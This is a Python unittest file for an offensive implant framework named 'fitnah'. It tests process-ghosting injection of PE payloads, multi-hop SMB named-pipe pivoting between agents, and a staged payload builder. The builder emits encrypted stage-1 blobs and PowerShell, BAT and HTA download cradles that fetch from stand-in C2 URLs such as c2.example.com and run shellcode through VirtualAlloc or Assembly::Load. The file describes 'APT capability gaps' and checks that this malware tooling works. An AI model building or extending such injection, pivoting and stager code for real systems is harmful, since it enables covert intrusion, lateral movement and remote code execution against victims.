"""
tests/test_gap_implementations.py

Tests for the three APT capability gaps:
  1. Process Ghosting  — ghost_inject plugin
  2. Multi-hop SMB mesh — smb_pivot.py plugin (route_add / route_del / route_list)
  3. Staged payload    — fitnah.builder.stagers.staged module
"""
import base64
import json
import os
import struct
import sys
import types
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

# ── Path setup ────────────────────────────────────────────────────────────────
ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

# ── Minimal PE stub (MZ header, enough to pass validation) ───────────────────
_MZ_PE = b"MZ" + b"\x00" * 62  # 64 bytes, starts with MZ

# ── Shared mock context ───────────────────────────────────────────────────────

class MockCtx:
    """Minimal PluginContext stub for unit tests."""

    def __init__(self):
        self._queue = {}

    def queue(self, command: str, response: dict):
        self._queue[command] = response

    def send(self, command: str, args: dict = None):
        if command in self._queue:
            return self._queue.pop(command)
        return {"status": "error", "msg": f"no mock for '{command}'"}

    def exec(self, cmd):
        return {"status": "ok", "output": ""}

    def ps(self, script):
        return {"status": "ok", "output": ""}

    def upload(self, path, b64):
        return {"status": "ok"}


# ═══════════════════════════════════════════════════════════════════════════════
# 1. Process Ghosting — ghost_inject plugin
# ═══════════════════════════════════════════════════════════════════════════════

class TestGhostInject(unittest.TestCase):

    def setUp(self):
        from fitnah.plugins.execution.ghost_inject import GhostInject
        self.plugin = GhostInject()
        self.ctx = MockCtx()
        self.session = MagicMock()

    def test_no_ctx_returns_error(self):
        r = self.plugin.run(self.session, {"pe_b64": base64.b64encode(_MZ_PE).decode()})
        self.assertFalse(bool(r))
        self.assertIn("live session", r.error or "")

    def test_missing_pe_returns_error(self):
        r = self.plugin.run(self.session, {}, ctx=self.ctx)
        self.assertFalse(bool(r))
        self.assertIn("pe_b64", r.error or "")

    def test_invalid_base64_returns_error(self):
        r = self.plugin.run(self.session, {"pe_b64": "!not_base64!"}, ctx=self.ctx)
        self.assertFalse(bool(r))

    def test_non_pe_bytes_rejected(self):
        bad = base64.b64encode(b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX").decode()
        r = self.plugin.run(self.session, {"pe_b64": bad}, ctx=self.ctx)
        self.assertFalse(bool(r))
        self.assertIn("MZ", r.error or "")

    def test_ghost_inject_ok(self):
        self.ctx.queue("ghost_inject", {"status": "ok", "pid": 1234})
        pe_b64 = base64.b64encode(_MZ_PE).decode()
        r = self.plugin.run(self.session, {"pe_b64": pe_b64}, ctx=self.ctx)
        self.assertTrue(bool(r))
        self.assertIn("1234", r.data)

    def test_ghost_inject_implant_error(self):
        self.ctx.queue("ghost_inject", {"status": "error", "msg": "NtCreateSection failed: 0xC0000005"})
        pe_b64 = base64.b64encode(_MZ_PE).decode()
        r = self.plugin.run(self.session, {"pe_b64": pe_b64}, ctx=self.ctx)
        self.assertFalse(bool(r))
        self.assertIn("NtCreateSection", r.error or "")

    def test_pe_path_ok(self, tmp_path=None):
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as f:
            f.write(_MZ_PE)
            name = f.name
        try:
            self.ctx.queue("ghost_inject", {"status": "ok", "pid": 5678})
            r = self.plugin.run(self.session, {"pe_path": name}, ctx=self.ctx)
            self.assertTrue(bool(r))
        finally:
            os.unlink(name)

    def test_pe_path_not_found(self):
        r = self.plugin.run(self.session, {"pe_path": "/nonexistent/payload.exe"}, ctx=self.ctx)
        self.assertFalse(bool(r))
        self.assertIn("not found", r.error or "")

    def test_custom_cmdline_sent(self):
        sent_args = {}

        def capture_send(cmd, args=None):
            sent_args.update(args or {})
            return {"status": "ok", "pid": 42}

        self.ctx.send = capture_send
        pe_b64 = base64.b64encode(_MZ_PE).decode()
        self.plugin.run(self.session,
                        {"pe_b64": pe_b64, "cmdline": "notepad.exe fake"},
                        ctx=self.ctx)
        self.assertEqual(sent_args.get("cmdline"), "notepad.exe fake")

    def test_parent_pid_sent(self):
        sent_args = {}

        def capture_send(cmd, args=None):
            sent_args.update(args or {})
            return {"status": "ok", "pid": 42}

        self.ctx.send = capture_send
        pe_b64 = base64.b64encode(_MZ_PE).decode()
        self.plugin.run(self.session,
                        {"pe_b64": pe_b64, "parent_pid": 888},
                        ctx=self.ctx)
        self.assertEqual(int(sent_args.get("parent_pid", 0)), 888)


# ═══════════════════════════════════════════════════════════════════════════════
# 2. Multi-hop SMB mesh — smb_pivot plugin upgrades
# ═══════════════════════════════════════════════════════════════════════════════

class TestSmbPivotMesh(unittest.TestCase):

    def setUp(self):
        from fitnah.plugins.lateral_movement.smb_pivot import SmbPivot
        self.plugin = SmbPivot()
        self.ctx = MockCtx()
        self.session = MagicMock()

    def test_no_ctx(self):
        r = self.plugin.run(self.session, {"action": "listen", "pipe": "test123"})
        self.assertFalse(bool(r))
        self.assertIn("live session", r.error or "")

    def test_listen(self):
        self.ctx.queue("smb_pivot_listen",
                       {"status": "ok", "agent_id": 0x1001, "pipe": "fitnah_test"})
        r = self.plugin.run(self.session,
                            {"action": "listen", "pipe": "test123"},
                            ctx=self.ctx)
        self.assertTrue(bool(r))

    def test_connect(self):
        self.ctx.queue("smb_pivot_connect",
                       {"status": "ok", "agent_id": 0x1002})
        r = self.plugin.run(self.session,
                            {"action": "connect",
                             "pipe": "\\\\TARGET\\pipe\\fitnah_abc"},
                            ctx=self.ctx)
        self.assertTrue(bool(r))

    def test_route_add(self):
        self.ctx.queue("smb_pivot_route_add",
                       {"status": "ok"})
        r = self.plugin.run(self.session,
                            {"action": "route_add",
                             "dst_agent_id": "0x2000",
                             "via_agent_id": "0x1001"},
                            ctx=self.ctx)
        self.assertTrue(bool(r))

    def test_route_del(self):
        self.ctx.queue("smb_pivot_route_del",
                       {"status": "ok"})
        r = self.plugin.run(self.session,
                            {"action": "route_del",
                             "dst_agent_id": "0x2000"},
                            ctx=self.ctx)
        self.assertTrue(bool(r))

    def test_route_list(self):
        self.ctx.queue("smb_pivot_route_list",
                       {"status": "ok",
                        "routes": [{"dst": 0x2000, "via": 0x1001}]})
        r = self.plugin.run(self.session,
                            {"action": "route_list"},
                            ctx=self.ctx)
        self.assertTrue(bool(r))

    def test_list(self):
        self.ctx.queue("smb_pivot_list",
                       {"status": "ok",
                        "pivots": [{"agent_id": 0x1001, "pipe": "fitnah_test"}]})
        r = self.plugin.run(self.session, {"action": "list"}, ctx=self.ctx)
        self.assertTrue(bool(r))

    def test_send_payload(self):
        self.ctx.queue("smb_pivot_send",
                       {"status": "ok"})
        r = self.plugin.run(self.session,
                            {"action": "send",
                             "agent_id": "0x1001",
                             "data": base64.b64encode(b"hello").decode()},
                            ctx=self.ctx)
        self.assertTrue(bool(r))

    def test_route_add_missing_via(self):
        r = self.plugin.run(self.session,
                            {"action": "route_add",
                             "dst_agent_id": "0x2000"},  # missing via_agent_id
                            ctx=self.ctx)
        self.assertFalse(bool(r))


# ═══════════════════════════════════════════════════════════════════════════════
# 3. Staged payload — fitnah.builder.stagers.staged
# ═══════════════════════════════════════════════════════════════════════════════

class TestStagedPayload(unittest.TestCase):

    def setUp(self):
        from fitnah.builder.stagers import staged
        self.staged = staged

    # ── Key generation ────────────────────────────────────────────────────────
    def test_generate_key_32_bytes(self):
        k = self.staged.generate_stage_key()
        self.assertEqual(len(k), 32)

    def test_generate_key_unique(self):
        k1 = self.staged.generate_stage_key()
        k2 = self.staged.generate_stage_key()
        self.assertNotEqual(k1, k2)

    # ── Encrypt / decrypt round-trip ──────────────────────────────────────────
    def test_encrypt_decrypt_roundtrip(self):
        key   = self.staged.generate_stage_key()
        plain = b"stage1 payload bytes " * 100
        blob  = self.staged.encrypt_stage1(plain, key)
        # blob = nonce(12) + ciphertext + tag(16)
        self.assertGreater(len(blob), 12 + 16)
        recovered = self.staged.decrypt_stage1(blob, key)
        self.assertEqual(recovered, plain)

    def test_blob_starts_with_nonce(self):
        key  = self.staged.generate_stage_key()
        blob = self.staged.encrypt_stage1(b"test", key)
        self.assertEqual(len(blob[:12]), 12)   # nonce

    def test_wrong_key_raises(self):
        key1  = self.staged.generate_stage_key()
        key2  = self.staged.generate_stage_key()
        blob  = self.staged.encrypt_stage1(b"secret", key1)
        with self.assertRaises(Exception):
            self.staged.decrypt_stage1(blob, key2)

    # ── PS1 cradle rendering ──────────────────────────────────────────────────
    def test_render_ps1_contains_url(self):
        key = self.staged.generate_stage_key()
        ps1 = self.staged.render_ps1("https://c2.example.com/stage/agent001", key)
        self.assertIn("https://c2.example.com/stage/agent001", ps1)

    def test_render_ps1_contains_key_bytes(self):
        key = bytes(range(32))
        ps1 = self.staged.render_ps1("https://x.example.com/s", key)
        # key bytes should appear as comma-separated integers
        self.assertIn("0, 1, 2, 3", ps1)

    def test_render_ps1_dotnet_exec_block(self):
        key = self.staged.generate_stage_key()
        ps1 = self.staged.render_ps1("https://x.example.com/s", key, stage1_type="dotnet")
        self.assertIn("Assembly]::Load", ps1)

    def test_render_ps1_shellcode_exec_block(self):
        key = self.staged.generate_stage_key()
        ps1 = self.staged.render_ps1("https://x.example.com/s", key, stage1_type="shellcode")
        self.assertIn("VirtualAlloc", ps1)

    def test_render_bat_is_bat(self):
        ps1 = "@echo test"
        bat = self.staged.render_bat(ps1)
        self.assertIn("@echo off", bat)
        self.assertIn("powershell.exe", bat.lower())
        self.assertIn("-EncodedCommand", bat)

    def test_render_hta_is_hta(self):
        ps1 = "@echo test"
        hta = self.staged.render_hta(ps1)
        self.assertIn("<html>", hta.lower())
        self.assertIn("VBScript", hta)

    # ── Full build() API ──────────────────────────────────────────────────────
    def test_build_returns_tuple(self):
        stage1 = b"fake stage 1 shellcode bytes" * 10
        blob, key, stage0 = self.staged.build(
            "https://c2.example.com/stage/x", stage1)
        self.assertEqual(len(key), 32)
        self.assertIsInstance(blob, bytes)
        self.assertIsInstance(stage0, str)

    def test_build_blob_decrypts_to_stage1(self):
        stage1 = b"real stage 1 payload" * 50
        blob, key, _ = self.staged.build("https://c2.example.com/s", stage1)
        recovered = self.staged.decrypt_stage1(blob, key)
        self.assertEqual(recovered, stage1)

    def test_build_bat_format(self):
        stage1 = b"payload"
        _, _, stage0 = self.staged.build("https://c2.example.com/s", stage1,
                                          output_format="bat")
        self.assertIn("@echo off", stage0)

    def test_build_hta_format(self):
        stage1 = b"payload"
        _, _, stage0 = self.staged.build("https://c2.example.com/s", stage1,
                                          output_format="hta")
        self.assertIn("<html>", stage0.lower())

    def test_build_ps1_shellcode_type(self):
        stage1 = b"\x90" * 100
        _, _, stage0 = self.staged.build("https://c2.example.com/s", stage1,
                                          stage1_type="shellcode")
        self.assertIn("VirtualAlloc", stage0)

    def test_build_key_unique_per_call(self):
        _, k1, _ = self.staged.build("https://c2.example.com/s", b"p")
        _, k2, _ = self.staged.build("https://c2.example.com/s", b"p")
        self.assertNotEqual(k1, k2)


# ═══════════════════════════════════════════════════════════════════════════════
# 4. smb_pivot plugin update — route_add/del/list wired to plugin
# ═══════════════════════════════════════════════════════════════════════════════

class TestSmbPivotRouteCommands(unittest.TestCase):
    """Verify the new route_add/route_del/route_list dispatch in smb_pivot.py."""

    def setUp(self):
        from fitnah.plugins.lateral_movement.smb_pivot import SmbPivot
        self.plugin = SmbPivot()
        self.ctx = MockCtx()
        self.session = MagicMock()

    def test_schema_has_dst_agent_id(self):
        names = [p.name for p in self.plugin.schema.params]
        self.assertIn("dst_agent_id", names)

    def test_schema_has_via_agent_id(self):
        names = [p.name for p in self.plugin.schema.params]
        self.assertIn("via_agent_id", names)

    def test_route_add_sends_correct_command(self):
        captured = {}

        def fake_send(cmd, args=None):
            captured["cmd"] = cmd
            captured["args"] = args or {}
            return {"status": "ok"}

        self.ctx.send = fake_send
        self.plugin.run(self.session,
                        {"action": "route_add",
                         "dst_agent_id": "4097",
                         "via_agent_id": "4098"},
                        ctx=self.ctx)
        self.assertEqual(captured.get("cmd"), "smb_pivot_route_add")
        self.assertIn("dst_agent_id", captured.get("args", {}))


if __name__ == "__main__":
    unittest.main()
